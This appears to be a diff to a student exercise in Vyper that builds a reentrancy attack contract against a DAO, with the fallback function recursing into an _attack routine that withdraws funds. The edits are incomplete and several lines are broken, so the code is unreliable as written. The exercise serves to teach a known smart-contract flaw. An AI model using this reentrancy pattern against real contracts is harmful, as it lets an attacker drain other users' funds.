@@ -20,7 +20,8 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if(self.dao_address.balance < 0):
         return False
-    DAO(self.owner_address).deposit(value=100)
+    amountToWithdraw: uint256 = DAO(dao_address).userBalances[msg.sender]
+    DAO(self.dao_address).withdraw
 
     return True
 
@@ -54,8 +55,8 @@ def __default__():
     # This method gets invoked when Eth is sent to this contract's address (ie when Withdraw is called)
     
     # TODO: Add code here to complete the recursive call
-    amountToWithdraw: uint256 = DAO(dao_address).userBalances[msg.sender]
-    msg.sender.call.value(amountToWithdraw)("")
-    DAO.userBalances[msg.sender] = 0
-
+    #amountToWithdraw: uint256 = DAO(dao_address).userBalances[msg.sender]
+    #msg.sender.call.value(amountToWithdraw)("")
+    #DAO.userBalances[msg.sender] = 0
+    self._attack
     pass
